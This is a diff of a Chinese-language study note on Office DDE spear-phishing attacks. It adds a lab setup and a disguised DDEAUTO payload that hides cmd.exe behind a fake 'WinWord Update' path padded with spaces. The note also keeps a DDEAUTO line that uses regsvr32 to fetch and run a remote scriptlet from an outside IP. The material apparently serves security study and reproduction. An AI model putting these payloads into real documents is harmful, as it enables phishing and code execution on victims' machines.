@@ -1,5 +1,17 @@
 # DDE
 
+> 环境: Win7 + Office 2016
+>
+> 可以在 [MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)](https://msdn.itellyou.cn/?ang=2h-cn) 找对应的镜像
+>
+> - Office 2016: `ed2k://|file|cn_office_professional_plus_2016_x86_x64_dvd_6969182.iso|2588266496|27EEA4FE4BB13CD0ECCDFC24167F9E01|/`
+>
+> - Win7:
+>
+>   [原版软件 (itellyou.cn)](https://next.itellyou.cn/Original/#cbp=Product?ID=6f677346-0a09-43fa-b60d-e878ed7625a0)
+>
+>   
+
 > [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)
 
 DDE (Dynamic Data Exchange) 是一种用于在Windows应用程序之间交换数据的协议
@@ -22,6 +34,8 @@ DDE (Dynamic Data Exchange) 是一种用于在Windows应用程序之间交换数
 ---
 
 ## 弹计算器
+
+> [鱼叉钓鱼：利用 Office 文档进行 DDE 攻击-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1816083)
 
 以打开计算器为例, 在域代码中输入如下内容
 
@@ -48,6 +62,28 @@ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"
 > ![image-20240606103531060](http://cdn.ayusummer233.top/DailyNotes/202406061623998.png)
 >
 > ![image-20240606103541298](http://cdn.ayusummer233.top/DailyNotes/202406061623404.png)
+
+也可以伪装一下
+
+> [谨防钓鱼——OFFICE DDE复现_execl dde漏洞 复现-CSDN博客](https://blog.csdn.net/tempulcc/article/details/108471488)
+
+```js
+DDEAUTO C:\\Programs\\Office\\Updates\\WINWORD.exe/../../../../Windows\\System32\\cmd.exe "WinWord Update                                  /k calc.exe"
+```
+
+> PS: WinWord Update 和 `/k` 之间多加些空格, 否则效果不是很好:
+>
+> ![image-20240606181142069](http://cdn.ayusummer233.top/DailyNotes/202406061811150.png)
+>
+> ![image-20240606181228410](http://cdn.ayusummer233.top/DailyNotes/202406061812566.png)
+>
+> ![image-20240606181240958](http://cdn.ayusummer233.top/DailyNotes/202406061812069.png)
+
+![image-20240606181847082](http://cdn.ayusummer233.top/DailyNotes/202406061818175.png)
+
+![image-20240606181815913](http://cdn.ayusummer233.top/DailyNotes/202406061818994.png)
+
+![image-20240606181828940](http://cdn.ayusummer233.top/DailyNotes/202406061818028.png)
 
 ---
 
@@ -134,6 +170,8 @@ DDEAUTO c:\\windows\\system32\\cmd.exe "/k regsvr32 /s /n /u /i:http://100.1.1.1
 ![image-20240606152808558](http://cdn.ayusummer233.top/DailyNotes/202406061624209.png)
 
 ![image-20240606152851391](http://cdn.ayusummer233.top/DailyNotes/202406061624930.png)
+
+![image-20240606175736169](http://cdn.ayusummer233.top/DailyNotes/202406061758785.png)
 
 火绒可检出:
 
